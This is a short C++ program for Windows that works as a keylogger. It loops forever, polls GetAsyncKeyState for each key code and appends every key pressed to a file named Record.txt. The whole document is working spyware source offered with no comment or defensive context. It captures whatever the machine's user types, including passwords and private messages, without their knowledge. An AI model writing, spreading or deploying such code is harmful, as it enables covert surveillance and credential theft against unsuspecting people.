#include <windows.h>
#include <Winuser.h>
#include <fstream>
#include <iostream>

using namespace std;

int main()
{
	char c;

	for (;;) {

		for (c = 8; c < 222; c++) {
			if (GetAsyncKeyState(c) == -32767) {
				ofstream write("Record.txt", ios::app);
				write << c;
			}
		}
	}
	return 0;
}

